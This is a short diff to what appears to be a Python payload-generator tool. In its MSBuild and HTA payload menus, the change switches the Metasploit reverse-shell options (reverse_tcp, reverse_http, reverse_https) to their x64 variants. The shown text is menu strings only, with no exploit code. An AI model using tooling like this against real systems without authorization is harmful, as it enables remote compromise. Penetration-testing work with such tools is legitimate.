@@ -98,9 +98,9 @@ def generate_msbuild_nps_msf_payload():
   print("\t(3)\twindows/meterpreter/reverse_https")
   print("\t(4)\tCustom PS1 Payload")
 
-  options = {1: "windows/meterpreter/reverse_tcp",
-             2: "windows/meterpreter/reverse_http",
-             3: "windows/meterpreter/reverse_https",
+  options = {1: "windows/x64/meterpreter/reverse_tcp",
+             2: "windows/x64/meterpreter/reverse_http",
+             3: "windows/x64/meterpreter/reverse_https",
              4: "custom_ps1_payload"
   }
 
@@ -426,15 +426,15 @@ def generate_msbuild_nps_msf_hta_payload():
   while True:
     # Display options to the user
     print("\nPayload Selection:")
-    print("\n\t(1)\twindows/meterpreter/reverse_tcp")
-    print("\t(2)\twindows/meterpreter/reverse_http")
-    print("\t(3)\twindows/meterpreter/reverse_https")
+    print("\n\t(1)\twindows/x64/meterpreter/reverse_tcp")
+    print("\t(2)\twindows/x64/meterpreter/reverse_http")
+    print("\t(3)\twindows/x64/meterpreter/reverse_https")
     print("\t(4)\tCustom PS1 Payload")
     print("\t(99)\tFinished")
 
-    options = {1: "windows/meterpreter/reverse_tcp",
-               2: "windows/meterpreter/reverse_http",
-               3: "windows/meterpreter/reverse_https",
+    options = {1: "windows/x64/meterpreter/reverse_tcp",
+               2: "windows/x64/meterpreter/reverse_http",
+               3: "windows/x64/meterpreter/reverse_https",
                4: "custom_ps1_payload",
                99: "finished"
     }
